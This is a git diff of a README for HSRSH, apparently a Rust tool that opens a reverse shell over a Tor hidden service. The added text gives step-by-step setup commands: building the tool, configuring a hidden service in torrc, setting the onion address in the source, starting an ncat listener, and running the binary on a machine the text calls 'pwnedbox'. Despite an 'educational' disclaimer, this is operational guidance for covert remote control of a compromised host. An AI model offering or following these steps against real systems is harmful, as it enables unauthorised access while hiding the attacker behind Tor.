@@ -5,26 +5,47 @@ Hidden Service Reverse Shell, aka HSRSH
 This was a quickly written tool for demonstrating a reverse shell over a hidden service all in
 one binary and an excuse to play with Rust. Solely for educational purposes.
 
-1. Configure your hidden service on server you will be accepting the shell connection on. Add this to your torrc
+## Building
+
+```
+$ git clone https://github.com/dustyfresh/hsrsh
+
+$ cd hsrsh
+
+$ cargo build --release
+
+# Release binary is ./target/release/hsrsh
+```
+
+
+1. Configure your hidden service server you will be accepting the shell connection on. Make sure netcat is installed, and add this to your ```torrc```, and then start tor
 
   ```
     HiddenServiceDir /var/lib/tor/hidden_service/
     HiddenServicePort 1337 127.0.0.1:1337
   ```
+  Once Tor is bootstrapped you can get the onion address from the hidden service directory
 
-2. Start listener on the hidden service. MAKE SURE TO ONLY ALLOW LOCALHOST CONNECTIONS
+  ```
+  $ cat /var/lib/tor/hidden_service/
+  changeme.onion
+  ```
+
+2. Edit ```src/main.rs``` and add your onion address to the ```ONION_LISTENER``` variable
+
+3. Start listener on the hidden service using ```ncat```. MAKE SURE TO ONLY ALLOW LOCALHOST CONNECTIONS
 
   ```
     user@localhost:~$ ncat --allow 127.0.0.1 -nvl 127.0.0.1 -p 1337
     Ncat: Listening on 0.0.0.0:1337
   ```
 
-3. Execute reverse shell binary, it will create a local tor instance and connect to your listener. This takes about 15 seconds.
+4. Execute reverse shell binary, it will create a local tor instance and connect to your listener. This takes about 15 seconds.
     ```
     user@pwnedbox:~$ ./hsrsh
     ```
 
-4. If everything is setup properly your shell should connect after about 20 seconds or so assuming the tor and internet connection is stable.
+5. If everything is setup properly your shell should connect after about 20 seconds or so assuming the tor and internet connection is stable.
 
   ```    
     user@localhost:~$ ncat --allow 127.0.0.1 -nvlp 1337
